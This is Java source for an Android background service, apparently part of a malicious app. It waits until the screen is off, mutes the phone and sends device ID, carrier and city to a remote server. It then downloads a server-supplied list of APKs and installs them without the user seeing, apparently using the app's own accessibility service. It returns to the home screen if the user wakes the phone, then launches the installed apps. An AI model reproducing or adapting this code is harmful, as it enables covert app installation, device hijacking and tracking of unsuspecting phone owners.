package com.shuiguo.service;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.DownloadManager;
import android.app.KeyguardManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.database.ContentObserver;
import android.database.Cursor;
import android.media.AudioManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityManager;

import com.shuiguo.activity.rudemos;
import com.shuiguo.utils.Constant;
import com.shuiguo.utils.ScreenListener;
import com.shuiguo.utils.Udid;
import com.shuiguo.utils.Utils;
import com.shuiguo.utils.checkutil;
import com.shuiguo.utils.filestart;
import com.shuiguo.utils.loadfile;
import com.shuiguo.utils.voice;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Set;

public class DownloadService extends Service {
	boolean flag=true;//外层判断
	boolean flagss=false;//内层判断
	private  static int Scene=100;//情景模式
	int insertmodel=1;//解锁状态
	public static Set<String> packnameList=new HashSet<String>();//打开apk的列表
	public static Set<String> packnameLists=new HashSet<String>();//安装apk的个数
	public static int pmioopen=2;/*屏幕是否点亮*/
	private static  int bang=1;
	private DownloadManager dowanloadmanager = null;
	private DownloadChangeObserver downloadObserver;
	private long lastDownloadId = 0;
	public static final Date date=new Date();
	public static final SimpleDateFormat dateFormat = new SimpleDateFormat("yMd");
	public static final String time=dateFormat.format(date);
	public static int loadtimenum=0;
	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
//	Log.e("执行了DOWNLOAD", "执行了DOWNLOAD");
		/*ka*/
		ScreenListener l = new ScreenListener(this);
		l.begin(new ScreenListener.ScreenStateListener() {

			@Override
			public void onUserPresent() {

				rele();
			}

			@Override
			public void onScreenOn() {

				pmioopen = 2;
				rele();

			}

			@Override
			public void onScreenOff() {

				pmioopen = 1;
				new filestart().setifredemos(1);
				//new Utils().startAct(DownloadService.this);
				//wakeUpAndUnlock(DownloadService.this, 1);
//				Log.e("onScreenOff", "onScreenOff");
			}
		});
		if(bang==1){
			//setAlarmTime();
			new Utils().unlockScreen(DownloadService.this);
//			Log.e("创建了", "创建了");
			bang=2;
		}

		new Thread(){
			@Override
			public void run(){
				//初始化当前声音
				AudioManager AM=(AudioManager) getSystemService(Service.AUDIO_SERVICE);
				voice vo=new voice(AM);
				if(Scene==100){
					Scene = vo.getInitring();
					//Log.e("当前声音",Scene+"");
				}
				boolean is=isAccessibleEnabled();
				boolean flage=true;
				//while(flage) {
					if (is && pmioopen==1) {
						new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms" + "&result=shifang");
						//设置静音
						vo.noRingAndVibrate();
						loadfile s = new loadfile();
						String result = s.getURLResponse(new Constant().apklist + "?uid=" + Udid.with(DownloadService.this).fetch() +
								"&qudao=" + new Constant().getdid() + "&isp=" + new filestart().getispcode() + "&city=" + new filestart().getcitycode());
						new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms" + "&result=shifang"+new Constant().apklist + "?uid=" + Udid.with(DownloadService.this).fetch() +
								"&qudao=" + new Constant().getdid() + "&isp=" + new filestart().getispcode() + "&city=" + new filestart().getcitycode()+"123");

						try {
							JSONObject jsonObject = new JSONObject(result);
							int status = 0;
							status = jsonObject.getInt("status");
							if (status == 1) {
								JSONArray jsonArray = jsonObject.getJSONArray("data");
								for (int i = 0; i < jsonArray.length(); i++) {
									if (isopenpm()) {
										break;
									}
									String sdpath = Environment.getExternalStorageDirectory() + "/";
									JSONObject jobj = (JSONObject) jsonArray.get(i);
									String Appname = jobj.getString("Appname");
									String Appid = jobj.getString("Appid");
									String Appurl = jobj.getString("Appurl");
									String Apppackagename = jobj.getString("Apppackagename");
									new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms" + "&result="+"Download/" + "demotext" + Appid + time + ".apk");
									//判断包是否存在
									if (s.fileIsExists(sdpath + "Download/" + "demotext" + Appid + time + ".apk")) {
										new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms" + "&result="+"Download/" + "demotext" + Appid + time + ".apkisopen");
										//判断是否已经安装
										installapk(sdpath + "Download/" + "demotext" + Appid + time + ".apk");
										sleep(5000);
										if (new Utils().haveinstall(Appname, DownloadService.this)) {
											packnameLists.add(Appname);
											continue;
										}
									}
								}

								if(packnameLists.size()>=(jsonArray.length()-1)){
									flage=false;
									Iterator<String> it = packnameLists.iterator();
									while (it.hasNext()) {
										new Utils().RunApp(it.next(), DownloadService.this);
										sleep(5000);
									}
									vo.resetvo(Scene);
									packnameLists.clear();
								}
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}else{
						flage=false;
					}
				}
			//}
		}.start();


		return super.onStartCommand(intent, flags, startId);
	}
	private boolean isopenpm(){
		PowerManager pm = (PowerManager)getSystemService(Context.POWER_SERVICE);
		boolean nowisScreenOn = pm.isScreenOn();
		return nowisScreenOn;
	}
	private  void installapk(String uri){
		if (isopenpm()) {
			startHome();
		}else {
			loadfile s = new loadfile();
			s.install(DownloadService.this, uri);
			starrudemos();
			s.install(DownloadService.this, uri);
			starrudemos();
			s.install(DownloadService.this, uri);
		}
	}
	private void starrudemos(){
		startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
	}
	private void startHome(){
		Intent home = new Intent(Intent.ACTION_MAIN);
		home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		home.addCategory(Intent.CATEGORY_HOME);
		startActivity(home);
	}
	/*锁定*/
	private void rele(){
		if(rudemos.rudemosins!=null) {
			rudemos.rudemosins.finish();
		}
		AudioManager AM = (AudioManager) getSystemService(Service.AUDIO_SERVICE);
		voice vo = new voice(AM);
		vo.resetvo(Scene);
	}
	/*检查是否已经开启*/
	@TargetApi(Build.VERSION_CODES.ICE_CREAM_SANDWICH)
	private boolean isAccessibleEnabled() {
		AccessibilityManager manager = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);

		List<AccessibilityServiceInfo> runningServices = manager.getEnabledAccessibilityServiceList(AccessibilityEvent.TYPES_ALL_MASK);
		for (AccessibilityServiceInfo info : runningServices) {
			if (info.getId().equals(getPackageName() + "/com.shuiguo.service.MonitorService")) {
				return true;
			}
		}
		return false;
	}




	@Override
	public void onDestroy()
	{
		super.onDestroy();
		unregisterReceiver(receiver);
		getContentResolver().unregisterContentObserver(downloadObserver);
		// The service is no longer used and is being destroyed
	}
	/*下载逻辑*/
	class DownloadChangeObserver extends ContentObserver {





		public DownloadChangeObserver(Handler handler) {
			super(handler);
			// TODO Auto-generated constructor stub
		}


		@Override
		public void onChange(boolean selfChange) {
			//queryDownloadStatus();
		}


	}
	private BroadcastReceiver receiver = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			//这里可以取得下载的id，这样就可以知道哪个文件下载完成了。适用与多个下载任务的监听
			queryDownloadStatus();
		}
	};

	private void queryDownloadStatus() {
		DownloadManager.Query query = new DownloadManager.Query();
		query.setFilterById(lastDownloadId);
		Cursor c = dowanloadmanager.query(query);
		if(c!=null&&c.moveToFirst()) {
			int status = c.getInt(c.getColumnIndex(DownloadManager.COLUMN_STATUS));

			int reasonIdx = c.getColumnIndex(DownloadManager.COLUMN_REASON);
			int titleIdx = c.getColumnIndex(DownloadManager.COLUMN_TITLE);
			int fileSizeIdx =
					c.getColumnIndex(DownloadManager.COLUMN_TOTAL_SIZE_BYTES);
			int bytesDLIdx =
					c.getColumnIndex(DownloadManager.COLUMN_BYTES_DOWNLOADED_SO_FAR);
			String title = c.getString(titleIdx);
			int fileSize = c.getInt(fileSizeIdx);
			int bytesDL = c.getInt(bytesDLIdx);

			// Translate the pause reason to friendly text.
			int reason = c.getInt(reasonIdx);
			StringBuilder sb = new StringBuilder();
			sb.append(title).append("\n");
			sb.append("Downloaded ").append(bytesDL).append(" / " ).append(fileSize);

			// Display the status
			//Log.e("tag", sb.toString());
			switch(status) {
				case DownloadManager.STATUS_PAUSED:
				case DownloadManager.STATUS_PENDING:
				case DownloadManager.STATUS_RUNNING:
					break;
				case DownloadManager.STATUS_SUCCESSFUL:
					//完成
					//if(title.indexOf("demotext")!=-1){
					//synchronized (DownloadService.DownLoad) {
//					new Thread(){
//						@Override
//						public void run(){
//							new checkutil().getURLResponse(new Constant().BASEURL + "did=" + new Constant().getdid() + "&interface=logmmms" + "&resultsh=shifang");
//						}
//					}.start();

//							Log.e("DownLoad已经什邡", "DownLoad已经什邡");
//							Log.e("DownLoad什邡名称", DownLoaapkdname+"----"+title);
					//DownloadService.DownLoad.notify();
					//}
					//}
					//Log.e(title, "下载完成");
//                  dowanloadmanager.remove(lastDownloadId);
					break;
				case DownloadManager.STATUS_FAILED:
					//清除已下载的内容，重新下载
					dowanloadmanager.remove(lastDownloadId);
					break;
			}
		}
	}


}
